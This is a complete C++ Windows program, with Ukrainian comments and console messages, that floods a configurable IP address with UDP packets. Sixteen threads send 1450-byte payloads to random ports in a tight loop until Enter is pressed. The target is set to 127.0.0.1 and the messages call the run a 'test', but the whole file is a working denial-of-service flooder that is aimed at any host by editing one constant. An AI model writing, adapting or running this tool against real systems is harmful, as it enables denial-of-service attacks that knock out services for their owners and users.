#ifndef WIN32_LEAN_AND_MEAN
#define WIN32_LEAN_AND_MEAN
#endif
#include <iostream>
#include <vector>
#include <thread>
#include <winsock2.h>
#include <ws2tcpip.h>
#include <atomic>
#include <random>
#include <algorithm>
#pragma comment(lib, "ws2_32.lib")
std::atomic<bool> stop_flag(false);
const char* TARGET_IP = "127.0.0.1"; 
const int THREAD_COUNT = 16;
void flood() {
    SOCKET sock = socket(AF_INET, SOCK_DGRAM, IPPROTO_UDP);
    if (sock == INVALID_SOCKET) return;
    int sndbuf = 4 * 1024 * 1024; // Збільшено до 4MB
    setsockopt(sock, SOL_SOCKET, SO_SNDBUF, (const char*)&sndbuf, sizeof(sndbuf));

    sockaddr_in target = {};
    target.sin_family = AF_INET;
    if (inet_pton(AF_INET, TARGET_IP, &target.sin_addr) <= 0) {
        closesocket(sock);
        return;
    }
    char data[1450];
    std::fill_n(data, 1450, 'X');
    std::random_device rd;
    std::mt19937 gen(rd() ^ std::hash<std::thread::id>{}(std::this_thread::get_id()));
    std::uniform_int_distribution<> dis(1, 65535);

    while (!stop_flag) {
        target.sin_port = htons(dis(gen));
        if (sendto(sock, data, sizeof(data), 0, (struct sockaddr*)&target, sizeof(target)) == SOCKET_ERROR) {
            if (WSAGetLastError() == WSAENOBUFS) {
                std::this_thread::sleep_for(std::chrono::microseconds(10));
            }
        }
    }
    closesocket(sock);
}
int main() {
    WSADATA wsaData;
    if (WSAStartup(MAKEWORD(2, 2), &wsaData) != 0) {
        return 1;
    }
    if (std::string(TARGET_IP).empty()) {
        std::cout << "Вкажіть IP адресу в коді!" << std::endl;
        return 1;
    }
    std::cout << "Запуск тесту на: " << TARGET_IP << std::endl;
    std::cout << "Натисніть Enter, щоб зупинити..." << std::endl;
    std::vector<std::thread> threads;
    for (int i = 0; i < THREAD_COUNT; ++i) {
        threads.emplace_back(flood);
    }
    std::cin.get();
    stop_flag = true;
    std::cout << "Зупинка потоків..." << std::endl;

    for (auto& t : threads) {
        if (t.joinable()) t.join();
    }
    WSACleanup();
    return 0;
}
